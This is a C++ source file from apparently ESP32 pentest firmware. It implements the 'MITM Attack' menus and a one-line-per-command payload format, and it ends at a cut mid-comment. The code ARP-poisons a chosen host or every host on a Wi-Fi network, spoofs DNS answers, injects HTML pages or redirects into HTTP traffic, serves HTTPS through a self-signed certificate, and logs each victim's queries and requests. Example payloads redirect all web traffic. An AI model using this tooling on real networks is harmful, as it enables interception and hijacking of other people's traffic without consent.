#include "mitm_menu.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include "core/utils.h"
#include "core/wifi/wifi_common.h"
#include "wifi_atks.h"
#include <FS.h>
#include <esp_wifi.h>
#include <globals.h>
#include <vector>

// DNS Inject / HTML Intercept - the two menus that drive the net_spoof engine
// from the keypad (WiFi > Wifi Atks), plus the card payload format they read.
//
// The attack path is the engine's own: ARP-pair the target and its gateway, then
// answer its DNS queries / HTTP requests from the station link. Nothing in this
// file injects a raw frame, so it works on WPA2/WPA3 exactly like the JS
// bindings do.
//
// Everything a script can do here is also reachable headlessly through the
// `dnsinject` / `htmlint` console verbs (mitm_commands.cpp), which is how these
// menus are regression-tested on the board.

// ===========================================================================
// 1. Filesystem helpers
// ===========================================================================

static FS *mitmFs() {
    FS *fs = nullptr;
    if (!getFsStorage(fs)) return nullptr;
    return fs;
}

bool mitmEnsurePayloadDirs() {
    FS *fs = mitmFs();
    if (!fs) return false;
    if (!fs->exists(MITM_PAYLOAD_DIR)) fs->mkdir(MITM_PAYLOAD_DIR);
    if (!fs->exists(MITM_HTML_DIR)) fs->mkdir(MITM_HTML_DIR);
    return fs->exists(MITM_PAYLOAD_DIR);
}

String mitmPayloadRead(const String &path, size_t maxBytes, MitmPayloadResult &res) {
    res.path = path;
    res.ok = false;
    FS *fs = mitmFs();
    if (!fs) {
        res.error = "no filesystem (no SD card and LittleFS not mounted)";
        return String();
    }
    File f = fs->open(path, FILE_READ);
    if (!f || f.isDirectory()) {
        res.error = "cannot open " + path;
        return String();
    }

    String out;
    out.reserve(maxBytes + 1);
    while (f.available() && out.length() < maxBytes) {
        int c = f.read();
        if (c < 0) break;
        out += (char)c;
    }
    res.truncated = f.available() > 0;
    f.close();
    return out;
}

/// Read one line out of @p text starting at @p from; returns the next position
/// or -1 when the text is exhausted. The line is trimmed and keeps no CR.
static int mitmNextLine(const String &text, int from, String &line) {
    int len = text.length();
    if (from > len) return -1;
    int nl = text.indexOf('\n', from);
    if (nl < 0) {
        line = text.substring(from);
        line.trim();
        return -1;
    }
    line = text.substring(from, nl);
    line.trim();
    return nl + 1;
}

/// Split the first two whitespace-separated tokens of a payload line.
static bool mitmTwoTokens(const String &line, String &first, String &second) {
    int sp = line.indexOf(' ');
    if (sp < 0) return false;
    first = line.substring(0, sp);
    first.trim();
    String rest = line.substring(sp + 1);
    rest.trim();
    int sp2 = rest.indexOf(' ');
    if (sp2 > 0) rest = rest.substring(0, sp2);
    second = rest;
    second.trim();
    return first.length() > 0 && second.length() > 0;
}

static bool mitmWriteText(const String &path, const char *body, String *error) {
    FS *fs = mitmFs();
    if (!fs) {
        if (error) *error = "no filesystem";
        return false;
    }
    mitmEnsurePayloadDirs();
    File f = fs->open(path, FILE_WRITE, true);
    if (!f) {
        if (error) *error = "cannot write " + path;
        return false;
    }
    size_t n = f.print(body);
    f.close();
    if (n == 0) {
        if (error) *error = "write failed: " + path;
        return false;
    }
    return true;
}

// ===========================================================================
// 2. Payload model
// ===========================================================================

MitmPayloadResult mitmPayloadLoadDns(const String &path, bool clearFirst) {
    MitmPayloadResult res;
    String text = mitmPayloadRead(path, MITM_DNS_MAX_BYTES, res);
    if (res.error.length()) return res;

    if (clearFirst) netspoof_dns_clear_rules();

    int pos = 0;
    while (pos >= 0) {
        String line;
        int next = mitmNextLine(text, pos, line);
        pos = next;
        if (line.length() == 0 || line.startsWith("#")) {
            res.skipped++;
            if (next < 0) break;
            continue;
        }

        String domain, ip;
        if (!mitmTwoTokens(line, domain, ip)) {
            res.bad++;
            if (next < 0) break;
            continue;
        }
        IPAddress parsed;
        if (!parsed.fromString(ip.c_str())) {
            res.bad++;
            if (next < 0) break;
            continue;
        }

        bool wildcard = (domain == "*");
        String err;
        if (!netspoof_dns_add_rule(domain, ip, wildcard, err)) {
            // Most often the 8-rule table is full; count it, keep going.
            res.bad++;
        } else {
            res.loaded++;
        }
        if (next < 0) break;
    }

    res.ok = res.loaded > 0;
    if (!res.ok && res.error.length() == 0) {
        res.error = res.bad > 0 ? "no usable rules (all lines rejected)" : "payload is empty";
    }
    return res;
}

MitmPayloadResult mitmPayloadLoadRedirects(const String &path, bool clearFirst) {
    MitmPayloadResult res;
    String text = mitmPayloadRead(path, MITM_REDIRECT_MAX_BYTES, res);
    if (res.error.length()) return res;

    // One file, one redirect list: a reload replaces the previous list instead
    // of stacking a second copy beside it (the page payload is left alone).
    if (clearFirst) netspoof_http_clear_redirects();

    int pos = 0;
    while (pos >= 0) {
        String line;
        int next = mitmNextLine(text, pos, line);
        pos = next;
        if (line.length() == 0 || line.startsWith("#")) {
            res.skipped++;
            if (next < 0) break;
            continue;
        }
        String pattern, url;
        if (!mitmTwoTokens(line, pattern, url)) {
            res.bad++;
            if (next < 0) break;
            continue;
        }
        bool wildcard = (pattern == "*");
        String err;
        if (!netspoof_http_add_redirect(pattern, url, wildcard, err)) {
            res.bad++;
        } else {
            res.loaded++;
        }
        if (next < 0) break;
    }

    res.ok = res.loaded > 0;
    if (!res.ok && res.error.length() == 0) {
        res.error = res.bad > 0 ? "no usable rules (all lines rejected)" : "payload is empty";
    }
    return res;
}

MitmPayloadResult mitmPayloadLoadHtml(const String &path, const String &match) {
    MitmPayloadResult res;
    String html = mitmPayloadRead(path, MITM_HTML_MAX, res);
    if (res.error.length()) return res;
    if (html.length() == 0) {
        res.error = "payload is empty: " + path;
        return res;
    }

    String pattern = match;
    pattern.trim();
    bool wildcard = (pattern.length() == 0 || pattern == "*");
    // One page payload at a time: the engine keys rules by pattern, so without
    // this a changed Match: would leave the previous rule armed beside the new
    // one (and the first, often '*', would win every request).
    netspoof_http_clear_injections();
    if (!netspoof_http_add_injection(pattern, html, wildcard, res.error)) return res;

    res.loaded = 1;
    res.ok = true;
    return res;
}

// ===========================================================================
// 3. Example payloads
// ===========================================================================

static const char MITM_DNS_EXAMPLE[] =
    "# Vandeta DNS Inject payload\n"
    "# one rule per line: <domain> <ip>\n"
    "#   a domain also matches its subdomains\n"
    "#   * as the domain answers EVERY query - keep it last\n"
    "#   lines starting with # are comments\n"
    "example.com 192.168.4.1\n"
    "*.test.local 192.168.4.1\n";

static const char MITM_REDIRECT_EXAMPLE[] =
    "# Vandeta HTML Intercept redirects\n"
    "# one rule per line: <pattern> <url>\n"
    "#   * = every web request (HTTP on any port, and HTTPS), otherwise a host\n"
    "#       or host substring\n"
    "* http://192.168.4.1/\n";

static const char MITM_HTML_EXAMPLE[] =
    "<!doctype html><meta name=viewport content=\"width=device-width\">\n"
    "<title>Vandeta</title>\n"
    "<body style=\"font:16px system-ui;background:#111;color:#eee;padding:24px\">\n"
    "<h1>MITM Attack</h1>\n"
    "<p>This page came from the T-Embed, not from the site you asked for.</p>\n"
    "</body>\n";

// One payload for the whole attack. Every line is a thin front end for a JS
// API call (see the format note at the top of mitm_menu.h).
static const char MITM_SCRIPT_EXAMPLE[] =
    "# Vandeta MITM payload\n"
    "# one command per line, # = comment\n"
    "#\n"
    "#   page <match> <file>            200 + HTML for matching web requests\n"
    "#   redirect <match> <url>         302 for matching web requests\n"
    "#   dns <name|*> <ip>              answer DNS queries\n"
    "#   target all|<ip>                override the page's Target mode\n"
    "#   fallback dns <ip> [secs]       if no web request landed in <secs>\n"
    "#   fallback redirect <url> [secs] ... the same, with a 302 instead\n"
    "#   (chain up to 3 fallbacks; each <secs> counts from the start)\n"
    "#   info                           log the network the board is on\n"
    "#   probe all|<ip>                 ARP-resolve the target(s) and log them\n"
    "#   (info/probe are read-only and run before any request is answered)\n"
    "#\n"
    "# <match> is a host substring, or * for every request.\n"
    "# <file> is relative to /BruceSpoof and must fit 1100 bytes.\n"
    "\n"
    "page * html/redirect.html\n"
    "\n"
    "# Point every name at the gateway, whose MAC the poison already sends to\n"
    "# this board, so the page can catch hosts that resolved before the poison.\n"
    "# `gateway` / `this` are accepted instead of a hard-coded address.\n"
    "dns * gateway\n"
    "\n"
    "# Plain HTTP is answered on every TCP port. HTTPS is served by the board's\n"
    "# self-signed TLS endpoint, so the browser shows its certificate warning\n"
    "# once; after continuing, the same page/redirect applies. While HTTPS is\n"
    "# up, every DNS A answer points at the board.\n"
    "#fallback dns gateway 10\n"
    "#fallback redirect http://192.168.1.1/ 25\n";

bool mitmPayloadWriteExample(const String &path, bool overwrite, String *error) {
    FS *fs = mitmFs();
    if (!fs) {
        if (error) *error = "no filesystem";
        return false;
    }
    mitmEnsurePayloadDirs();
    if (!overwrite && fs->exists(path)) {
        if (error) *error = "already exists: " + path;
        return false;
    }

    const char *body = MITM_DNS_EXAMPLE;
    if (path == MITM_SCRIPT_PAYLOAD) body = MITM_SCRIPT_EXAMPLE;
    else if (path == MITM_REDIRECT_PAYLOAD) body = MITM_REDIRECT_EXAMPLE;
    else if (path.endsWith(".html") || path.endsWith(".htm")) body = MITM_HTML_EXAMPLE;
    return mitmWriteText(path, body, error);
}

int mitmPayloadWriteAllExamples(bool overwrite) {
    String err;
    int written = 0;
    if (mitmPayloadWriteExample(MITM_DNS_PAYLOAD, overwrite, &err)) written++;
    if (mitmPayloadWriteExample(MITM_REDIRECT_PAYLOAD, overwrite, &err)) written++;
    if (mitmPayloadWriteExample(MITM_SCRIPT_PAYLOAD, overwrite, &err)) written++;
    if (mitmPayloadWriteExample(String(MITM_HTML_DIR) + "/index.html", overwrite, &err)) written++;
    return written;
}

// ===========================================================================
// 4. UI helpers
// ===========================================================================

/// Short label for a payload path (the screen is 320 px wide).
static String mitmShortPath(const String &path) {
    int slash = path.lastIndexOf('/');
    String name = slash >= 0 ? path.substring(slash + 1) : path;
    if (name.length() == 0) name = path;
    if (name.length() > 20) name = name.substring(0, 20) + "..";
    return name;
}

static void mitmClearKeys() {
    EscPress = false;
    SelPress = false;
    PrevPress = false;
    NextPress = false;
    UpPress = false;
    DownPress = false;
    AnyKeyPress = false;
}

/// Paged text viewer: SEL/NEXT advances, BACK leaves. Lines are 42 characters.
static void mitmShowLines(const String &title, const std::vector<String> &lines) {
    const int perPage = 6;
    int pages = ((int)lines.size() + perPage - 1) / perPage;
    if (pages < 1) pages = 1;
    int page = 0;

    mitmClearKeys();
    while (true) {
        drawMainBorderWithTitle(title);
        tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
        int y = 40;
        for (int i = page * perPage; i < (int)lines.size() && i < (page + 1) * perPage; i++) {
            tft.drawString(lines[i].substring(0, 42), 8, y);
            y += LH * FM + 2;
        }
        tft.drawString(
            String(page + 1) + "/" + String(pages) + "  SEL next  BACK exit", 8, tftHeight - 18
        );

        bool advance = false;
        while (!advance) {
            if (check(EscPress)) {
                mitmClearKeys();
                return;
            }
            if (check(SelPress) || check(NextPress) || check(DownPress)) advance = true;
            vTaskDelay(pdMS_TO_TICKS(20));
        }
        mitmClearKeys();
        page = (page + 1) % pages;
    }
}

/// Split a payload into display-width lines for mitmShowLines().
static void mitmPushWrapped(std::vector<String> &out, const String &body, int width = 40) {
    int pos = 0;
    while (pos >= 0) {
        String line;
        int next = mitmNextLine(body, pos, line);
        pos = next;
        if (line.length() == 0) {
            out.push_back("");
        } else {
            for (int i = 0; i < (int)line.length(); i += width) out.push_back(line.substring(i, i + width));
        }
        if (next < 0) break;
    }
}

// ===========================================================================
// 5. Shared setup: station + ARP pairs
// ===========================================================================

bool mitmEnsureStation() { return WiFi.isConnected(); }

/// Last action's outcome for the ARP page.
static String mitmTargetsNote;

/// True when the user picked this page's own "Main Menu" row.
///
/// The stock addOptionToMainMenu()/backToMenu() pair sets the global
/// returnToMenu, but the console's `ui`/`press` helpers also call backToMenu()
/// after every command, so the flag is already set by the time a row runs. These
/// pages decide from their own row instead, and clear the flag when they stay.
static bool mitmMainPicked = false;

/// Fit a note into one menu row.
static String mitmNoteLabel(const String &note) {
    String s = note.length() ? note : String("ready");
    if (s.length() > 38) s = s.substring(0, 38);
    return s;
}

/**
 * @brief Stop interception and restore ARP when the page is left.
 *
 * Whoever was poisoned keeps sending its gateway traffic here, so leaving the
 * menu without restoring the two ARP mappings would cut the target off the
 * network until its cache expired. (A script owns the engine's lifetime; these
 * menus own it only for as long as they are on screen.)
 */
static void mitmTeardown() {
    String err;
    if (netspoof_https_active()) netspoof_https_stop(err);
    if (netspoof_http_active()) netspoof_http_stop(err);
    if (netspoof_dns_active()) netspoof_dns_stop(err);
    if (netspoof_arp_active()) netspoof_arp_stop(err);
}

// ===========================================================================
// 6. Unified payload: one file describes the whole attack
// ===========================================================================
//
// The format is deliberately plain: one command per line, `#` comments. Every
// command is a thin front end for a binding the JavaScript API already has, so
// the same attack can be written here or in a script:
//
//   page <match> <file>              httpInterceptor.addInjection()
//   redirect <match> <url>           httpInterceptor.addRedirect()
//   dns <name|*> <ip>                dnsSpoof.addRule() / startAll()
//   target all|<ip>                  arpSpoof.start() for each host
//   fallback dns <ip> [secs]         ... when no HTTP request landed
//   fallback redirect <url> [secs]   ... the same, with a 302 instead
//   info                             log SSID/channel/board IP/gateway MAC
//   probe all|<ip>                   ARP-resolve the targets and log them
//
// `info` and `probe` only read: they never poison a host or change a rule, so a
// payload can describe the network it landed on and still run the same attack.
//
// A `.html` payload is shorthand for `page * <that file>`.

/// Next whitespace-separated token of @p line starting at @p pos.
static String mitmNextToken(const String &line, int &pos) {
    int len = line.length();
    while (pos < len && (line[pos] == ' ' || line[pos] == '\t')) pos++;
    int start = pos;
    while (pos < len && line[pos] != ' ' && line[pos] != '\t') pos++;
    return line.substring(start, pos);
}

/// Payload-relative paths resolve under /BruceSpoof, absolute ones stay as-is.
static String mitmResolveScriptPath(const String &raw) {
    String p = raw;
    p.trim();
    if (p.length() == 0) return p;
    if (p.startsWith("/")) return p;
    return String(MITM_PAYLOAD_DIR) + "/" + p;
}

/**
 * @brief Resolve a DNS answer token: an IPv4 literal, `gateway`, or `this`.
 *
 * The gateway is the useful default. A DNS answer has to point at an address
 * whose MAC the victim already sends to this board (the poisoned gateway), so
 * `dns * gateway` works on any network without hard-coding 192.168.x.1. `this`
 * is the board's own station address, which needs something listening on the
 * port - the JS API's captive-portal path, not this engine.
 */
static bool mitmResolveSpecIp(const String &token, String &out) {
    IPAddress parsed;
    if (parsed.fromString(token.c_str())) {
        out = parsed.toString();
        return true;
    }
    if (token.equalsIgnoreCase("gateway") || token.equalsIgnoreCase("gw")) {
        IPAddress gw;
        uint8_t mac[6];
        if (!netspoof_gateway_info(gw, mac)) return false;
        out = gw.toString();
        return true;
    }
    if (token.equalsIgnoreCase("this") || token.equalsIgnoreCase("board")) {
        if (!WiFi.isConnected()) return false;
        out = WiFi.localIP().toString();
        return true;
    }
    return false;
}

/// "20" -> 20000 ms; anything unusable keeps @p fallbackMs.
static uint32_t mitmParseSeconds(const String &s, uint32_t fallbackMs) {
    long v = s.toInt();
    if (v <= 0) return fallbackMs;
    if (v > 600) v = 600;
    return (uint32_t)v * 1000;
}

MitmScriptResult mitmPayloadLoadScript(const String &path) {
    MitmScriptResult res;
    res.path = path;

    String lower = path;
    lower.toLowerCase();
    // A page file picked on its own is the old HTML-Intercept payload: one page,
    // every request. mitmPayloadLoadHtml() already clears the injection class.
    if (lower.endsWith(".html") || lower.endsWith(".htm")) {
        MitmPayloadResult html = mitmPayloadLoadHtml(path, "*");
        if (!html.ok) {
            res.error = html.error.length() ? html.error : String("page not loaded");
            return res;
        }
        res.pages = 1;
        res.ok = true;
        return res;
    }

    MitmPayloadResult read;
    String text = mitmPayloadRead(path, MITM_SCRIPT_MAX_BYTES, read);
    if (read.error.length()) {
        res.error = read.error;
        return res;
    }
    if (text.length() == 0) {
        res.error = "payload is empty: " + path;
        return res;
    }
    res.truncated = read.truncated;

    // One payload is one attack: loading another replaces what was armed, so a
    // stale '*' rule can never answer for the new one.
    netspoof_dns_clear_rules();
    netspoof_http_clear_rules();

    int pos = 0;
    while (pos >= 0) {
        String line;
        int next = mitmNextLine(text, pos, line);
        pos = next;
        if (line.length() == 0 || line.startsWith("#")) {
            res.skipped++;
            if (next < 0) break;
            continue;
        }

        int cur = 0;
        String cmd = mitmNextToken(line, cur);
        cmd.toLowerCase();
        String err;

        if (cmd == "page" || cmd == "inject") {
            String match = mitmNextToken(line, cur);
            String file = mitmNextToken(line, cur);
            if (match.length() == 0 || file.length() == 0) {
                res.bad++;
            } else {
                MitmPayloadResult page;
                String body = mitmPayloadRead(mitmResolveScriptPath(file), MITM_HTML_MAX, page);
                if (page.error.length() || body.length() == 0) {
                    res.bad++;
                    Serial.printf("[MITM] page %s: %s\n", file.c_str(), page.error.c_str());
                } else {
                    bool wildcard = (match == "*");
                    if (netspoof_http_add_injection(match, body, wildcard, err)) res.pages++;
                    else res.bad++;
                }
            }
        } else if (cmd == "redirect" || cmd == "302") {
            String match = mitmNextToken(line, cur);
            String url = mitmNextToken(line, cur);
            if (match.length() == 0 || url.length() == 0) res.bad++;
            else if (netspoof_http_add_redirect(match, url, match == "*", err)) res.redirects++;
            else res.bad++;
        } else if (cmd == "dns") {
            String name = mitmNextToken(line, cur);
            String raw = mitmNextToken(line, cur);
            String ip;
            bool okIp = mitmResolveSpecIp(raw, ip);
            // `gateway` / `this` are stored as tokens and resolved per query, so
            // a payload loads while the station is still down and answers
            // correctly once it joins (`dns * gateway`).
            if (name.length() == 0 || (raw.length() == 0)) res.bad++;
            else if (netspoof_dns_add_rule(name, okIp ? ip : raw, name == "*", err)) res.dns++;
            else res.bad++;
        } else if (cmd == "target" || cmd == "arp") {
            String who = mitmNextToken(line, cur);
            who.toLowerCase();
            IPAddress parsed;
            if (who == "all" || parsed.fromString(who.c_str())) res.target = who;
            else res.bad++;
        } else if (cmd == "forward") {
            String mode = mitmNextToken(line, cur);
            mode.toLowerCase();
            if (mode == "on" || mode == "yes" || mode == "1") res.forward = 2;
            else if (mode == "auto") res.forward = 1;
            else if (mode == "off" || mode == "no" || mode == "0") res.forward = 0;
            else res.bad++;
        } else if (cmd == "offline") {
            String what = mitmNextToken(line, cur);
            String file = mitmNextToken(line, cur);
            what.toLowerCase();
            if (what == "page" && file.length()) res.offlinePage = mitmResolveScriptPath(file);
            else res.bad++;
        } else if (cmd == "info") {
            // Reconnaissance only: no arguments, nothing armed.
            res.wantInfo = true;
        } else if (cmd == "probe" || cmd == "lookup") {
            String who = mitmNextToken(line, cur);
            who.toLowerCase();
            IPAddress parsed;
            if (who != "all" && !parsed.fromString(who.c_str())) {
                res.bad++;
            } else if (res.probeCount < MITM_PROBE_MAX) {
                res.probes[res.probeCount++] = who;
            } else {
                // More than MITM_PROBE_MAX lines is a payload mistake, not a
                // rule failure; count it so `mitm payload` says so.
                res.bad++;
            }
        } else if (cmd == "fallback") {
            String kind = mitmNextToken(line, cur);
            String value = mitmNextToken(line, cur);
            String secs = mitmNextToken(line, cur);
            kind.toLowerCase();
            bool isDns = (kind == "dns");
            bool isRedirect = (kind == "redirect" || kind == "302");
            if (!isDns && !isRedirect) {
                res.bad++;
            } else if (value.length() == 0) {
                res.bad++;
            } else {
                String stored = value;
                if (isDns) {
                    String ip;
                    // An unresolvable token is kept verbatim and resolved per
                    // query, exactly like a `dns` rule (`gateway` while the
                    // station is still associating).
                    if (mitmResolveSpecIp(value, ip)) stored = ip;
                }
                uint32_t after = mitmParseSeconds(secs, MITM_FALLBACK_DEFAULT_MS);
                res.fallbackSet = true;
                res.fallbackDns = isDns;
                res.fallbackValue = stored;
                res.fallbackAfterMs = after;
                // Chain: a payload can list several fallbacks and they are
                // tried in file order, each at its own time from the start.
                if (res.fallbackCount < MITM_FALLBACK_MAX) {
                    MitmFallbackStep &step = res.fallbacks[res.fallbackCount++];
                    step.dns = isDns;
                    step.value = stored;
                    step.afterMs = after;
                }
            }
        } else {
            res.bad++;
        }

        if (next < 0) break;
    }

    res.ok = (res.pages + res.redirects + res.dns) > 0;
    if (!res.ok && res.error.length() == 0) {
        res.error = res.bad > 0 ? String("no usable lines (all rejected)") : String("payload has no rules");
    }
    return res;
}

// ===========================================================================
// 7. MITM Attack page
// ===========================================================================

static String mitmScriptPath = "";        // chosen payload file
static bool mitmAllTargets = true;        // Target mode: every host / one host
static String mitmTargetIpStr = "";
static uint8_t mitmTargetMac[6] = {0};
static bool mitmTargetMacOk = false;
static String mitmAttackNote = "ready"; // outcome shown by the ARP/targets page

static void mitmSetTargetAll() {
    mitmAllTargets = true;
    mitmAttackNote = "ok: every host the scan finds";
}

static void mitmSetTargetOne(const IPAddress &ip, const uint8_t *mac) {
    mitmAllTargets = false;
    mitmTargetIpStr = ip.toString();
    mitmTargetMacOk = false;
    if (mac != nullptr) {
        memcpy(mitmTargetMac, mac, 6);
        mitmTargetMacOk = true;
    }
    mitmAttackNote = "ok: target " + mitmTargetIpStr;
}

static String mitmTargetLabel() {
    if (mitmAllTargets) return String("All devices");
    if (mitmTargetIpStr.length() == 0) return String("Single (none picked)");
    return mitmTargetIpStr;
}

/// Scan, then let the user switch networks. Picking one runs Bruce's own
/// connect path: saved password first, keyboard prompt when it is unknown.
///
/// The candidate rows are built into a LOCAL vector on purpose. They used to be
/// pushed into the shared global `options`, which is the vector the MITM page
/// itself is iterating while this handler runs: clearing it here destroyed the
/// page's Option objects (including the std::function that was executing) and
/// the page restarted or froze, so "Network: pick one" looked like it did
/// nothing. A local vector leaves the caller's menu untouched, exactly like the
/// nested-menu guard in loopOptions() does for other pages.
static void mitmPickNetwork() {
    // The MITM engine needs the radio more than any background feature does, so
    // free what the other pages leave behind (BLE host, Web UI, a stale capture)
    // and carry on either way: a scan with a little less RAM beats refusing with
    // a "free wifi/ble" line, and the note row that used to say so is gone.
    wifiEnsureRadioMem();
    drawMainBorderWithTitle("MITM Network");
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.drawString("Scanning...", 10, 50);

    int found = wifiScanNets(false);
    if (found <= 0) {
        mitmAttackNote = "err: no networks found";
        // Say it on screen: the row that opened this picker still reads "pick
        // one", so returning to it silently is what made this look broken.
        displayError("No networks found", true);
        mitmClearKeys();
        return;
    }

    std::vector<Option> nets;
    for (int i = 0; i < found && i < 24; i++) {
        String ssid = WiFi.SSID(i);
        int enc = WiFi.encryptionType(i);
        // Channel + BSSID from the scan are the direct-association fast path
        // (see _connectToWifiNetwork): without them the driver sweeps every
        // channel looking for the SSID before it associates.
        uint8_t ch = (uint8_t)WiFi.channel(i);
        uint8_t bssid[6] = {0};
        if (WiFi.BSSID(i) != nullptr) memcpy(bssid, WiFi.BSSID(i), 6);
        String joined = WiFi.isConnected() ? WiFi.SSID() : String("");
        String label = ssid.length() ? ssid : String("(hidden)");
        if (ssid.length() && ssid == joined) label += "  joined";
        label += (enc == WIFI_AUTH_OPEN) ? "  open" : "  locked";
        label += "  " + String(WiFi.RSSI(i)) + "dBm";
        nets.push_back({label, [ssid, enc, ch, bssid]() {
                            if (ssid.length() == 0) {
                                mitmAttackNote = "err: hidden network needs its name";
                                return;
                            }
                            if (!_wifiConnect(ssid, enc, ch, bssid)) {
                                displayError("Could not join " + ssid, true);
                            }
                        }});
    }
    nets.push_back({"Back", []() {}});
    loopOptions(nets, MENU_TYPE_SUBMENU, "MITM Network");
    mitmClearKeys();
}

/// ARP-scan the joined network and pick "All devices" or one host.
static void mitmPickTargets() {
    if (!mitmEnsureStation()) {
        mitmAttackNote = "err: connect to WiFi first";
        return;
    }

    String err;
    drawMainBorderWithTitle("MITM Targets");
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.drawString("ARP scanning...", 10, 50);
    int found = netspoof_scan_targets(8000, err);
    if (found < 0) {
        mitmAttackNote = "err: " + (err.length() ? err : String("ARP scan failed"));
        return;
    }
    if (found == 0) mitmAttackNote = "warn: no host answered ARP";

    // Local rows, for the same reason as mitmPickNetwork(): this runs while the
    // MITM page is iterating its own vector, and "Re-scan" re-enters it.
    std::vector<Option> targets;
    targets.push_back({String("Last: ") + mitmNoteLabel(mitmAttackNote), []() {}});
    targets.push_back({String("All devices (") + String(found) + " hosts)", []() { mitmSetTargetAll(); }});
    for (int i = 0; i < netspoof_target_count(); i++) {
        const NetSpoofTarget *t = netspoof_target(i);
        if (!t || t->gateway) continue; // the gateway is a pair's far end, never a victim
        // Copy the MAC: the target list can be rebuilt by a later scan.
        uint8_t mac[6];
        memcpy(mac, t->mac, 6);
        IPAddress ip = t->ip;
        String label = ip.toString() + "  " + t->macStr;
        targets.push_back({label, [ip, mac]() { mitmSetTargetOne(ip, mac); }});
    }
    targets.push_back({"Re-scan", []() { mitmPickTargets(); }});
    targets.push_back({"Back", []() {}});
    loopOptions(targets, MENU_TYPE_SUBMENU, "MITM Targets");
    mitmClearKeys();
}

/// Pair the hosts this run will poison. Returns how many pairs came up.
static int mitmPairTargets(const String &override, String &err) {
    bool all = mitmAllTargets;
    String onlyIp = mitmTargetIpStr;
    if (override == "all") all = true;
    else if (override.length()) {
        all = false;
        onlyIp = override;
    }

    if (!all) {
        IPAddress ip;
        if (!ip.fromString(onlyIp.c_str())) {
            err = "pick a single target first (Target row)";
            return 0;
        }
        bool ok;
        if (mitmTargetMacOk && onlyIp == mitmTargetIpStr) {
            ok = netspoof_arp_start_mac(ip, mitmTargetMac, IPAddress((uint32_t)0), err);
        } else {
            ok = netspoof_arp_start(ip, IPAddress((uint32_t)0), err);
        }
        return ok ? 1 : 0;
    }

    // All devices: one scan, then pair from the MACs it already saw. Re-resolving
    // each address is what used to fail on a dozing phone (see net_spoof.h).
    int found = netspoof_scan_targets(8000, err);
    if (found < 0) return 0;
    int pairs = 0;
    for (int i = 0; i < netspoof_target_count() && pairs < NETSPOOF_MAX_PAIRS; i++) {
        const NetSpoofTarget *t = netspoof_target(i);
        if (!t || t->gateway) continue;
        String one;
        if (netspoof_arp_start_mac(t->ip, t->mac, IPAddress((uint32_t)0), one)) {
            pairs++;
        } else {
            Serial.printf("[MITM] pair %s failed: %s\n", t->ip.toString().c_str(), one.c_str());
        }
    }
    if (pairs == 0) err = "no host could be paired";
    return pairs;
}

/// Encryption of the AP the board is associated with (WiFiClass has no
/// no-argument accessor for it).
static wifi_auth_mode_t mitmCurrentAuth() {
    wifi_ap_record_t ap;
    if (esp_wifi_sta_get_ap_info(&ap) == ESP_OK) return ap.authmode;
    return WIFI_AUTH_OPEN;
}

/// Human name for the encryption of the network the board joined.
static const char *mitmAuthName(wifi_auth_mode_t mode) {
    switch (mode) {
        case WIFI_AUTH_OPEN: return "open";
        case WIFI_AUTH_WEP: return "WEP";
        case WIFI_AUTH_WPA_PSK: return "WPA";
        case WIFI_AUTH_WPA2_PSK: return "WPA2";
        case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/WPA2";
        case WIFI_AUTH_WPA3_PSK: return "WPA3";
        case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA2/WPA3";
        default: return "secured";
    }
}

// ---------------------------------------------------------------------------
// Live activity log
// ---------------------------------------------------------------------------
// The run screen is a "what is it doing right now" feed, not a counter table:
// the old script printed numbers and a failed run looked exactly like one that
// was never reached. Every line is also mirrored to Serial, so the same feed is
// readable over USB (`usbdebug` console) while testing.
#define MITM_LOG_LINES 10
static String mitmLogLine[MITM_LOG_LINES];
static int mitmLogUsed = 0;
static uint32_t mitmRunStart = 0;

static void mitmLogAdd(const String &text) {
    String line = text;
    if (line.length() > 60) line = line.substring(0, 60);
    // A terminal-style timestamp: the feed is there to explain what happened
    // and when, which is the one thing a counter table could never do.
    char stamp[12];
    unsigned long secs = mitmRunStart ? (millis() - mitmRunStart) / 1000UL : 0;
    snprintf(stamp, sizeof(stamp), "+%lus ", secs);
    line = String(stamp) + line;
    for (int i = 0; i < MITM_LOG_LINES - 1; i++) mitmLogLine[i] = mitmLogLine[i + 1];
    mitmLogLine[MITM_LOG_LINES - 1] = line;
    if (mitmLogUsed < MITM_LOG_LINES) mitmLogUsed++;
    Serial.printf("[MITM] %s\n", line.c_str());
}

static void mitmLogClear() {
    for (int i = 0; i < MITM_LOG_LINES; i++) mitmLogLine[i] = "";
    mitmLogUsed = 0;
}

/// Copy the new captures (oldest first) into the activity log.
///
/// The ring keeps the newest entries at index 0, so new work is found through
/// the monotonic capture counter rather than timestamps: DNS and HTTP captures
/// routinely share a millisecond, and a "ts > last" scan silently dropped the
/// second one. @p lastTotal is updated even when the ring wrapped, so a burst
/// larger than the ring can never re-log old lines.
static void mitmLogCaptures(uint32_t &lastTotal) {
    uint32_t total = netspoof_capture_total();
    if (total == lastTotal) return;
    uint32_t fresh = total - lastTotal;
    if (fresh > (uint32_t)NETSPOOF_MAX_CAPTURES) fresh = NETSPOOF_MAX_CAPTURES;
    lastTotal = total;
    for (int i = (int)fresh - 1; i >= 0; i--) {
        const NetSpoofCapture *c = netspoof_capture(i);
        if (!c) continue;
        // A capture whose peer address could not be read (the TLS server's
        // socket, occasionally) still has a host name worth logging.
        String who = c->clientIp ? c->clientIp.toString() : String("client");
        if (c->kind == NETSPOOF_CAPTURE_DNS) {
            if (c->action == 1) mitmLogAdd(who + " dns " + c->host + " -> " + c->path);
            else mitmLogAdd(who + " dns query " + c->host);
            continue;
        }
        if (c->action == 1) {
            mitmLogAdd(who + " redirected " + c->host);
        } else if (c->action == 2) {
            mitmLogAdd(who + " got page " + c->host);
        } else if (c->action == 0) {
            mitmLogAdd(who + " " + String(c->method) + " " + c->host + " (no rule)");
        } else {
            mitmLogAdd(who + " " + String(c->method) + " " + c->host);
        }
    }
}

/// "aa:bb:cc:dd:ee:ff" for a 6-byte MAC (the panel font is ASCII only).
static String mitmMacLabel(const uint8_t *mac) {
    char buf[18];
    snprintf(
        buf, sizeof(buf), "%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]
    );
    return String(buf);
}

/**
 * @brief Run the payload's reconnaissance lines and log the result.
 *
